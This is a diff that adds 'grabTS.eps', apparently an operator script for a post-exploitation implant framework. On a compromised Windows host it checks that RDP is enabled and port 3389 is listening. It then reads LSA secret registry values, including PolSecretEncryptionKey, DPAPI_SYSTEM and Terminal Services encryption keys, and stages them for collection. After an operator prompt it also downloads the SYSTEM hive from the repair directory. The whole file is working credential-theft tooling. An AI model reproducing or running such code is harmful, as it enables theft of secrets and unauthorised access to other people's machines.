@@ -1,0 +1,98 @@
+#-------------------------------------------------------------------------------
+# File: grabTS.eps
+# Description: grab registry values and file of interest
+# v0.1 2009-08-12 Initial creation
+# v0.2 2009-08-19 added logic to run on all target with 3389 open
+#-------------------------------------------------------------------------------
+@include "DropboxAPI.epm";
+@include "UseMarkers.epm";
+@echo off;
+@record on;
+#Have we run this already?
+string $markerName;
+if(checkMarker("TERMSERV",$markerName)){
+	#found the marker. no need to pull from this guy again
+	echo "Found a marker. Looks like we've already done this before. Exiting";
+	return true;
+}
+
+#if this value is 0, they are allowing RDP connections
+`regquery -hive L -subkey "system\\currentcontrolset\\control\\terminal server" -value fDenyTSConnections`;
+string $regValue = GetCmdData("value_data");
+if($regValue != "00000000"){
+	#they are not allowing RDP connections in.
+	return true;
+}
+
+#next check, are they listening on 3389? Could have stale registry data
+`netstat`;
+string $portList = GetCmdData("local_addr");
+string $foundPort;
+string $tempPort;
+bool $portOpen = FALSE;
+foreach $tempPort($portList){
+	$foundPort = split(":",$tempPort);
+	if($foundPort[1] == "3389"){
+		#something is listening on 3389. might as well try
+		$portOpen = TRUE;
+		break;
+	}
+}
+if($portOpen != TRUE){
+	return true;
+}
+
+
+#got this far, setup the variables
+#string $getDir = GetEnv("_LPDIR_LOGS");
+string $getDir;
+_GetLpLogsDirectory($getDir);
+string $systemPath = GetEnv("SYSTEMROOT");
+string $queryAttempt;
+string $buffer;
+string $tempToCopy;
+int $i=0;
+string $regKeyRoot = "security\\policy";
+#don't know how to do this on one line in EP...
+string $toFind = "$regKeyRoot\\PolSecretEncryptionKey";
+$toFind[1] = "$regKeyRoot\\Secrets\\DPAPI_SYSTEM\\CurrVal";
+$toFind[2] = "$regKeyRoot\\Secrets\\L\$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75\\CurrVal";
+$toFind[3] = "$regKeyRoot\\Secrets\\L\$HYDRAENCKEY_dd2d98db-2316-11d2-b414-00c04fa30cc4\\CurrVal";
+$toFind[4] = "$regKeyRoot\\Secrets\\L\$HYDRAENCPUBLICKEY_dd2d98db-2316-11d2-b414-00c04fa30cc4\\CurrVal";
+	foreach $queryAttempt($toFind){
+	if(`regquery -hive L -subkey $queryAttempt`){
+		#found it! save this data
+		$i = sizeof($buffer);
+		$buffer[$i] = $queryAttempt;
+		$i++;
+		$tempToCopy = GetCmdData("value_data");
+		$buffer[$i] = $tempToCopy;
+	}
+}
+
+if(sizeof($buffer)==0){
+	#we didn't find anything. call it a day
+	return true;
+}
+
+AppendFileInDropbox("TERMSERV","TS_data.txt",$buffer);
+
+#want to get permission to do this. it might be a slow connection.
+@record off;
+@record on;
+`dir $systemPath\\repair\\system`;
+int $fileSize = GetCmdData("size");
+ifnot( prompt "I would like to download $systemPath\\repair\\system with a size of $fileSize\nMay I do so?"){
+	#not today. no marker set. Better luck next time
+	return true;
+}
+
+if(`get $systemPath\\repair\\system -foreground`){
+	string $localname = GetCmdData("LocalName");
+	string $localDir = GetCmdData("LocalGetDirectory");
+	MoveLocalFileToDropbox("TERMSERV","$getDir\\$localDir\\$localname");	
+	#set marker to indicate this has been run on this machine
+	setMarker("TERMSERV","grabTS was successfully executed");
+}
+
+return true;
